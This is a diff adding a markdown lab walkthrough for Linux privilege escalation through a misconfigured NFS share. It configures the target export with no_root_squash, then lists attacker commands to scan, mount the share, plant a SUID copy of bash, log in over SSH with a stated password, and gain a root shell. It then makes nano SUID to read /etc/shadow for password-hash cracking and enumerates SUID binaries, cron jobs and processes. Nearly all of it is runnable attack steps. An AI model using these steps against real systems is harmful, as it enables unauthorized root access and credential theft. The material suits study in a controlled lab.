@@ -1,1 +1,25 @@
-
+# Escalate Privileges in Linux Machine by Exploiting Misconfigured NFS -> Network File System (NFS) is a protocol that enables users to access files remotely through a network. Remote NFS can be accessed locally when the shares are mounted. If NFS is misconfigured, it can lead to unauthorized access to sensitive data or obtain a shell on a system.)
+>>> UBUNTU MACHINE [TARGET]
+1. sudo apt install nfs-kernel-server
+2. sudo nano /etc/exports   >>  /home *(rw,no_root_squash) >>  CTRL+S(save) >> CTRL+X(exit) 
+3. sudo /etc/init.d/nfs-kernel-server restart               (restart nfs server to apply configurations changes.)
+>>> PARROT MACHINE [ATTACKER]
+4. nmap -sV 10.10.1.9              (see that the port 2049 is open and nfs service is running on it)
+5. sudo apt-get install nfs-common        (client that access the directory shared by nfs-kernel-server)
+6. showmount -e 10.10.1.9               (check if any share is available for mount in the target machine)
+7. mkdir /tmp/nfs
+8. sudo mount -t nfs 10.10.1.9:/home /tmp/nfs            (to mount the nfs directory on the target machine.)
+9. cd /tmp/nfs
+10. sudo cp /bin/bash .               [here, .(dot) is for present directory \ means copy bash file in pwd]
+11. sudo chmod +s bash
+12. ls -la bash
+13. sudo df -h                      (get the amount of free disk available)
+14. ssh -l ubuntu 10.10.1.9   >> toor(password)                 (login into target machine using ssh)
+15. cd /home >> ls
+16. ./bash -p                 (-p : giving root privileges to bash)
+17. id >>  whoami  >>  cp /bin/nano .  >> chmod 4777 nano   >>  ls -la nano  >> ls >>  ./nano -p /etc/shadow (showing the hashes of all users You can copy any hash from the file and crack it using john the ripper or hashcat tools, to get the password of desired users)  
+18. cat /etc/crontab        (to view the running cronjobs)
+19. ps -ef         (to view current processes along with their PIDs)
+20. find / -name "*.txt" -ls 2> /dev/null    (view all the .txt files on the system)
+21. route -n          (view the host/network names in numeric form)
+22. find / -perm -4000 -ls 2> /dev/null          (view the SUID executable binaries)
